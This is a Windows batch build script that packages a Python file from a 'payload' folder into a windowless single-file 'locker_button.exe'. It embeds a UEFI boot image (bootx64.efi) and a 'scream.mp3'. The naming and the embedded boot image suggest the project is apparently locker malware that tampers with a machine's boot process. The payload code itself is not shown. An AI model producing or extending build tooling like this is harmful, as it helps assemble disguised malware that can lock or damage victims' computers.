@echo off
REM language: batch, file: build_exe.bat
REM Builds locker_button.exe with bootx64.efi embedded.

setlocal
set REPO_ROOT=%~dp0..
set PAYLOAD=%REPO_ROOT%\payload

if not exist "%REPO_ROOT%\bootx64.efi" (
    echo bootx64.efi not found. Run build_efi_windows.bat first.
    exit /b 1
)
if not exist "%PAYLOAD%\locker_button.py" (
    echo payload\locker_button.py not found.
    exit /b 1
)

cd /d "%REPO_ROOT%"

pyinstaller --noconsole --onefile --name locker_button ^
    --distpath dist ^
    --workpath build ^
    --add-data "assets;assets" ^
    --add-data "scream.mp3;." ^
    --add-data "bootx64.efi;." ^
    --paths "%PAYLOAD%" ^
    "%PAYLOAD%\locker_button.py"

echo Built: %REPO_ROOT%\dist\locker_button.exe
